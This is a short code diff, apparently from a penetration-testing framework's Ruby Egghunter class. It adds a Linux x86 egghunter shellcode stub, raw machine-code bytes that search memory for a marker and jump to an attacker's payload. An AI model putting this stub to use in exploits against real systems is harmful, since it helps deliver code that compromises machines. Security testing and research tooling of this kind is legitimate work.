@@ -43,6 +43,35 @@ class Egghunter
 	
 		end
 	end
+	
+	###
+	#
+	# Linux-based egghunters
+	#
+	###
+	module Linux
+		Alias = "linux"
+
+		module X86
+			Alias = ARCH_X86
+
+			#
+			# The egg hunter stub for linux/x86.
+			#
+			def hunter_stub
+				{
+					'Stub' => 
+						"\xfc\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80" +
+						"\x3c\xf2\x74\xf1\xb8" +
+						"\x41\x41\x41\x41" +
+						"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7",
+					'EggSize'   => 4,
+					'EggOffset' => 0x11
+				}
+			end
+
+		end
+	end
 
 	###
 	#
